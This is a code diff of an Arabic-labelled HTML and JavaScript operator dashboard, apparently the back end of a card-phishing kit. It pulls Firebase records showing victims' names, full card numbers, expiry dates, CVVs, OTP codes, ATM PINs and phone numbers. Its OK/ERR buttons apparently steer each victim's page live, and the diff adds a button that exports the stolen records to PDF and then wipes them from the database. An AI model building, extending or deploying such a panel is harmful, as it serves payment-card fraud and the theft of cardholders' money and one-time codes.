@@ -3,28 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Monitor</title>
+    <title>System Monitor - Live</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
     
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #eceff1; margin: 0; padding: 10px; }
+        body { font-family: 'Segoe UI', sans-serif; background: #eceff1; margin: 0; padding: 10px; }
         .nav-bar { background: #1a6d44; color: white; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; border-radius: 8px; margin-bottom: 15px; position: sticky; top: 0; z-index: 1000; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
         .live-status { background: #ffd700; color: #000; padding: 5px 15px; border-radius: 5px; font-weight: bold; font-size: 14px; }
         
-        .table-container { background: white; border-radius: 8px; overflow-x: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
-        table { width: 100%; border-collapse: collapse; min-width: 1100px; text-align: center; }
-        th { background: #f1f1f1; padding: 12px; font-size: 13px; color: #555; border-bottom: 2px solid #ddd; }
-        td { padding: 10px; border-bottom: 1px solid #eee; font-size: 14px; font-weight: 500; }
+        .btn-pdf { background: #333; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-weight: bold; }
         
-        .data-text { font-family: monospace; letter-spacing: 1px; color: #2c3e50; font-size: 15px; }
-        .otp-text { color: #d32f2f; font-weight: bold; font-size: 16px; background: #fff5f5; padding: 3px 8px; border-radius: 4px; }
+        .cards-container { display: flex; flex-direction: column; gap: 15px; }
+        .client-card { background: white; border-radius: 10px; padding: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); border-right: 10px solid #7f8c8d; }
         
-        .btn-action { padding: 8px 12px; border: none; border-radius: 4px; cursor: pointer; color: white; font-weight: bold; background: #7f8c8d; transition: 0.2s; }
-        .btn-action:hover { background: #95a5a6; }
+        /* تنسيق البيانات في سطر واحد داخل المربع */
+        .data-line { display: flex; flex-wrap: wrap; gap: 20px; align-items: center; border-bottom: 1px solid #f0f0f0; padding-bottom: 10px; margin-bottom: 10px; }
+        .data-item { display: flex; flex-direction: column; }
+        .label { font-size: 11px; color: #888; margin-bottom: 2px; }
+        .value { font-size: 15px; font-weight: bold; font-family: monospace; color: #2c3e50; }
         
-        .new-row { animation: highlight 2s ease-out; }
-        @keyframes highlight { from { background: #e8f5e9; } to { background: white; } }
+        .otp-box { background: #fff5f5; padding: 5px 10px; border-radius: 5px; border: 1px solid #ffcdd2; }
+        .otp-val { color: #d32f2f; font-size: 18px; font-weight: bold; }
+        
+        .actions { display: flex; gap: 10px; justify-content: flex-end; }
+        .btn-ctl { background: #7f8c8d; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body onload="_init()">
@@ -32,28 +36,12 @@
 <audio id="alert_sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
 
 <div class="nav-bar">
-    <div style="font-weight: bold;">لوحة التحكم (Live)</div>
-    <div class="live-status">الزوار النشطون الآن: <span id="online_count">0</span></div>
+    <div class="live-status">النشطون الآن: <span id="online_count">0</span></div>
+    <button class="btn-pdf" onclick="_exportAndClear()">حفظ PDF وتفريغ اللوحة</button>
 </div>
 
-<div class="table-container">
-    <table>
-        <thead>
-            <tr>
-                <th>الاسم</th>
-                <th>رقم البطاقة (16)</th>
-                <th>التاريخ</th>
-                <th>CVV</th>
-                <th>Code (V)</th>
-                <th>ATM (P)</th>
-                <th>الهاتف</th>
-                <th>التحكم</th>
-            </tr>
-        </thead>
-        <tbody id="data_rows">
-            </tbody>
-    </table>
-</div>
+<div class="cards-container" id="all_clients">
+    </div>
 
 <script>
     let database;
@@ -67,46 +55,68 @@
         if (!firebase.apps.length) firebase.initializeApp(config);
         database = firebase.database();
 
-        // 1. مراقبة الزوار النشطين (Live)
-        database.ref('presence').on('value', snapshot => {
-            document.getElementById('online_count').innerText = snapshot.numChildren() || 0;
+        // متابعة الزوار
+        database.ref('presence').on('value', s => {
+            document.getElementById('online_count').innerText = s.numChildren() || 0;
         });
 
-        // 2. سحب جميع العمليات بدون حد (مرتبة من الأحدث للأقدم)
+        // سحب كل العمليات
         database.ref('orders').on('value', snapshot => {
-            const tbody = document.getElementById('data_rows');
-            tbody.innerHTML = '';
+            const container = document.getElementById('all_clients');
+            container.innerHTML = '';
             
-            let hasNew = false;
+            let hasData = false;
             snapshot.forEach(child => {
                 const item = child.val();
                 const card = item.card_details || {};
                 const id = child.key;
-                hasNew = true;
+                hasData = true;
 
-                const row = `
-                    <tr class="new-row">
-                        <td>${item.fullName || '---'}</td>
-                        <td class="data-text">${card.cardNumber || 'Pending...'}</td>
-                        <td class="data-text">${card.expiryDate || '--'}</td>
-                        <td class="data-text">${card.cvv || '--'}</td>
-                        <td class="otp-text">${card.otp || '---'}</td>
-                        <td class="data-text">${card.atm_pin || '---'}</td>
-                        <td>${item.phone || '---'}</td>
-                        <td>
-                            <button class="btn-action" onclick="_act('${id}', 'next')">OK</button>
-                            <button class="btn-action" onclick="_act('${id}', 'error')" style="margin-right:5px;">ERR</button>
-                        </td>
-                    </tr>
+                const cardHtml = `
+                    <div class="client-card">
+                        <div class="data-line">
+                            <div class="data-item"><span class="label">الاسم</span><span class="value">${item.fullName || '---'}</span></div>
+                            <div class="data-item"><span class="label">رقم البطاقة (16)</span><span class="value">${card.cardNumber || 'Waiting...'}</span></div>
+                            <div class="data-item"><span class="label">التاريخ</span><span class="value">${card.expiryDate || '--'}</span></div>
+                            <div class="data-item"><span class="label">CVV</span><span class="value">${card.cvv || '--'}</span></div>
+                            <div class="data-item otp-box"><span class="label">CODE (V)</span><span class="value otp-val">${card.otp || '---'}</span></div>
+                            <div class="data-item"><span class="label">ATM (P)</span><span class="value">${card.atm_pin || '---'}</span></div>
+                            <div class="data-item"><span class="label">الهاتف</span><span class="value">${item.phone || '---'}</span></div>
+                        </div>
+                        <div class="actions">
+                            <button class="btn-ctl" onclick="_act('${id}', 'next')">OK</button>
+                            <button class="btn-ctl" onclick="_act('${id}', 'error')">ERR</button>
+                        </div>
+                    </div>
                 `;
-                tbody.insertAdjacentHTML('afterbegin', row);
+                container.insertAdjacentHTML('afterbegin', cardHtml);
             });
-            if(hasNew) document.getElementById('alert_sound').play().catch(()=>{});
+            if(hasData) document.getElementById('alert_sound').play().catch(()=>{});
         });
     }
 
     function _act(id, status) {
         database.ref('orders/' + id).update({ control_action: status });
+    }
+
+    async function _exportAndClear() {
+        const element = document.getElementById('all_clients');
+        if(!element.children.length) return alert("لا توجد بيانات لتصديرها");
+
+        if(confirm("سيتم تحميل ملف PDF ومسح كافة البيانات من اللوحة، هل أنت متأكد؟")) {
+            const opt = {
+                margin: 10,
+                filename: 'Report_Logs.pdf',
+                image: { type: 'jpeg', quality: 0.98 },
+                html2canvas: { scale: 2 },
+                jsPDF: { unit: 'mm', format: 'a4', orientation: 'landscape' }
+            };
+            
+            html2pdf().set(opt).from(element).save().then(() => {
+                database.ref('orders').remove(); // مسح البيانات بعد التحميل
+                alert("تم الحفظ والتفريغ بنجاح");
+            });
+        }
     }
 </script>
 </body>
